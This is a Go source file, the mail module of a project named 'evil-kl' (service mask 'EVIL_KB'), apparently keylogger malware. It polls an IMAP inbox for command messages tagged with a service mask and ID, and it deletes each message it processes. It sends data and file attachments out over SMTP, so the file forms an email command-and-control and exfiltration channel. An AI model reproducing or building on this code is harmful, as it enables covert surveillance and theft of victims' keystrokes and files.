package mail

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/smtp"
	"time"

	netMail "net/mail"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/emersion/go-message/mail"
	"github.com/scorredoira/email"
)

const (
	// DefaultServiceMask - default service mask for subject of message
	DefaultServiceMask = "EVIL_KB"
	// DefaultServiceID - default service id for subject of message
	DefaultServiceID = "unknown"
)

/*
Create <Mail> - init Mail structure
	Returns <*Mail>:
		1. Structure pointer
*/
func (m *Mail) Create() *Mail {
	m = &Mail{
		lc:           "MAIL",
		client:       &client.Client{},
		imapCfg:      config.IMAP{},
		smtpCfg:      config.SMTP{},
		lastMsgID:    0,
		serviceMask:  DefaultServiceMask,
		serviceID:    DefaultServiceID,
		chInlineData: make(chan map[string][]byte, 1),
		chCritError:  make(chan bool, 1),
	}

	return m
}

/*
SetIMAPSetting <Mail> - setting up IMAP
	Args:
		1. imapCfg <config.IMAP> - IMAP config
*/
func (m *Mail) SetIMAPSetting(imapCfg config.IMAP) {
	m.imapCfg = imapCfg
}

/*
SetSMTPSetting <Mail> - setting up SMTP
	Args:
		1. smtpCfg <config.SMTP> - SMTP config
*/
func (m *Mail) SetSMTPSetting(smtpCfg config.SMTP) {
	m.smtpCfg = smtpCfg
}

/*
SetServiceMask <Mail> - setting service's mask
	Args:
		1. serviceMask <string> - service mask
*/
func (m *Mail) SetServiceMask(serviceMask string) {
	m.serviceMask = serviceMask
}

/*
SetServiceID <Mail> - setting service's id
	Args:
		1. serviceID <string> - service id
*/
func (m *Mail) SetServiceID(serviceID string) {
	m.serviceID = serviceID
}

/*
GetChCritError <Mail> - getting the channel for receiving messages without attachments
	Returns <<-chan map[string][]byte>:
		1. messages's channel
*/
func (m *Mail) GetChInlineData() <-chan map[string][]byte {
	return m.chInlineData
}

/*
GetChCritError <Manager> - getting the channel of the critical error Mail
	Returns <<-chan bool>:
		1. error's channel
*/
func (m *Mail) GetChCritError() <-chan bool {
	return m.chCritError
}

// Run <Mail> - starting a connection to the mail server and processing messages
func (m *Mail) Run() {
	logger.InfoJ(m.lc, "Starting mail module")

	var err error

	path := fmt.Sprint(m.imapCfg.Host, ":", m.imapCfg.Port)

	logger.InfoJ(m.lc, fmt.Sprint("Connecting to ", path))

	m.client, err = client.DialTLS(path, nil)
	if err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error creating secure IMAP connection: ", err.Error()))
		m.chCritError <- true
		return
	}

	logger.InfoJ(m.lc, fmt.Sprint("Connected. Authentication..."))

	if err = m.client.Login(m.imapCfg.Username, m.imapCfg.Password); err != nil {
		logger.Error(m.lc, fmt.Sprint("Error authenticating client on mail server: ", err.Error()))
		m.chCritError <- true
		return
	}

	logger.InfoJ(m.lc, fmt.Sprint("Authentication completed"))

	go m.checker()
}

/*
fetching <Mail> - message receiving processing
	Args:
		1. seqSet <*imap.SeqSet> - representation of a set of message sequence numbers or UIDs
		2. items <[]imap.FetchItem> - list of message data item that can be fetched
		3. chMsgs <chan *imap.Message> - message receiving channel
*/
func (m *Mail) fetching(seqSet *imap.SeqSet, items []imap.FetchItem, chMsgs chan *imap.Message) {
	if err := m.client.Fetch(seqSet, items, chMsgs); err != nil {
		logger.CriticalJ(m.lc, fmt.Sprint("Error receiving message in the mailbox: ", err.Error()))
		m.chCritError <- true
		return
	}
}

// checker <Mail> - inbound message check loop
func (m *Mail) checker() {
	logger.InfoJ(m.lc, fmt.Sprint("Mail's checker has been started with interval ", m.imapCfg.CheckInterval, " sec"))

	for {
		m.step()
		time.Sleep(time.Duration(m.imapCfg.CheckInterval) * time.Second)
	}
}

// step <Mail> - processing an incoming message
func (m *Mail) step() {
	mailBoxStatus, err := m.client.Select(m.imapCfg.IncomingBox, false)
	if err != nil {
		logger.CriticalJ(m.lc, fmt.Sprint("Error selecting mailbox: ", err.Error()))
		m.chCritError <- true
		return
	}

	countMsg := mailBoxStatus.Messages

	if countMsg == 0 {
		return
	}

	seqSet := new(imap.SeqSet)
	seqSet.AddNum(countMsg)

	defer m.deleteMessage(seqSet)

	var section imap.BodySectionName
	items := []imap.FetchItem{section.FetchItem()}

	chMsgs := make(chan *imap.Message, 1)

	go m.fetching(seqSet, items, chMsgs)

	msg, ok := <-chMsgs
	if !ok {
		logger.ErrorJ(m.lc, fmt.Sprint("Channel of messages is closed"))
		return
	}

	if m.lastMsgID == msg.SeqNum {
		return
	}

	m.lastMsgID = msg.SeqNum

	if msg == nil {
		logger.ErrorJ(m.lc, "Invalid Message data")
		return
	}

	body := msg.GetBody(&section)

	mailReader, err := mail.CreateReader(body)
	if err != nil || mailReader == nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Failed to create mail reader: ", err.Error()))
		return
	}

	m.reader(mailReader)
}

/*
deleteMessage <Mail> - delete mail message
	Args:
		1. seqSet <*imap.SeqSet> - representation of a set of message sequence numbers or UIDs
*/
func (m *Mail) deleteMessage(seqSet *imap.SeqSet) {
	flags := []interface{}{imap.DeletedFlag}
	if err := m.client.Store(seqSet, "+FLAGS.SILENT", flags, nil); err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error changing message flag: ", err.Error()))
	}
}

/*
reader <Mail> - reading message data
	Args:
		1. mailReader <*mail.Reader> - mail reader
*/
func (m *Mail) reader(mailReader *mail.Reader) {
	header := mailReader.Header
	from, err := header.AddressList("From")
	if err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error parsing the email header: ", err.Error()))
		return
	}

	if len(from) == 0 {
		logger.ErrorJ(m.lc, "Error, message header does not contain addresses")
		return
	}

	firstAddress := from[0].Address

	if len(firstAddress) == 0 {
		logger.ErrorJ(m.lc, "Empty email address")
		return
	}

	subject, err := header.Subject()
	if err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error parsing Subject header: ", err.Error()))
		return
	}

	subjectData := subjectData{}

	if err := json.Unmarshal([]byte(subject), &subjectData); err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error parsing JSON data in Subject field: ", err.Error()))
		return
	}

	if subjectData.Description != m.serviceMask {
		logger.InfoJ(m.lc, "Wrong service's name, skiped...")
		return
	}

	if subjectData.UUID != m.serviceID {
		logger.InfoJ(m.lc, "Wrong service's id, skiped...")
		return
	}

	m.parts(mailReader, firstAddress)
}

/*
parts <Mail> - message parts processing
	Args:
		1. mailReader <*mail.Reader> - mail reader
		2. from <string> - sender's address
*/
func (m *Mail) parts(mailReader *mail.Reader, from string) {
	part, err := mailReader.NextPart()
	if err == io.EOF {
		return
	} else if err != nil {
		logger.ErrorJ(m.lc,
			fmt.Sprint("An error occurred while receiving the next part of the letter: ", err.Error()))
		return
	}

	switch part.Header.(type) {
	case *mail.InlineHeader:
		body, err := ioutil.ReadAll(part.Body)
		if err != nil {
			logger.ErrorJ(m.lc, fmt.Sprint("Error reading data from message body: ", err.Error()))
			return
		}

		if len(body) < 1 {
			logger.WarningJ(m.lc, fmt.Sprint("Empty body content: ", err.Error()))
			return
		}

		m.chInlineData <- map[string][]byte{from: body}
	}
}

/*
Send <Mail> - sending a message
	Args:
		1. sendTo <string> - addressee's address
		2. subject <string> - message description
		3. body <string> - data of message
		4. path <string> - attachment path
*/
func (m *Mail) Send(sendTo, subject, body, path string) error {
	logger.InfoJ(m.lc,
		fmt.Sprint("Sendind message [to: ", sendTo, "|subject: ", subject, "|body: ", body, "|path: ", path, "]"))

	msg := email.NewMessage(subject, body)
	msg.From = netMail.Address{Name: m.smtpCfg.Name, Address: m.smtpCfg.From}
	msg.To = []string{sendTo}

	if len(path) > 0 {
		if err := msg.Attach(path); err != nil {
			logger.ErrorJ(m.lc, fmt.Sprint("Error attaching file to message body: ", err.Error()))
			return err
		}
	}

	err := email.Send(fmt.Sprint(m.smtpCfg.Host, ":", m.smtpCfg.Port), smtp.PlainAuth("",
		m.smtpCfg.Username,
		m.smtpCfg.Password,
		m.smtpCfg.Host), msg)

	if err != nil {
		logger.ErrorJ(m.lc, fmt.Sprint("Error sending email: ", err.Error()))
		return err
	}

	logger.InfoJ(m.lc, "Sended")

	return nil
}
